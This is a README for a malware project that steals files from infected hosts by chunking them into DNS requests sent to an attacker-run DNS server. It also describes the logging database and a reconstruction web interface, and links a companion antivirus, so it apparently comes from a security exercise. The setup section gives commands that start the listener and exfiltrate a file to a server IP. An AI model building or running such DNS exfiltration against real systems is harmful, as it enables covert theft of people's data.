# SwaggyPloop

This project contains the infrastructure for a piece of malware that exfiltrates data from a computer via DNS requests.
* The `client` folder contains the code for the malware client that searches an infected host for important files. It then chunks the files into 254 byte blocks and sends out the chunks to our custom server via a DNS request.
* The `dns` folder contains our own custom fork of the `dnspython` library, which we use to form the DNS requests on the client side.
* The `dns_server` folder contains our custom DNS server that listens for incoming requests structured according to our custom request format and logs them in a database for later reconstruction.
* The `lib` folder contains the code that handles the encoding and packet structuring to break apart the files for transit as well as the code for reconstructing them on the server side. This folder also contains utility code for logging and querying into the database.
* The `web_interface` folder contains a web interface for viewing the data chunks logged in the database and allows for the reconstructed data to visualized.

The accompanying antivirus can be found [here](https://github.com/CrMallard/Antibody)

## Setup
This project requires Python `>=3.5`. You may run it in the virtual environment of your choice.

### Custom DNS Server
```
pip install -r requirements.txt
sudo python dns_server/malware_server.py # sudo is required to use port 53
```

### Exfiltrating a file (proof of concept)
```
pip install -r requirements.txt
python client/malware_client.py <file> [ip address of dns server]
```

## Authors
* Alvin Lin (omgimanerd)
* Stefan Aleksic (ColdSauce)
* Chris Remillard (CrMallard)
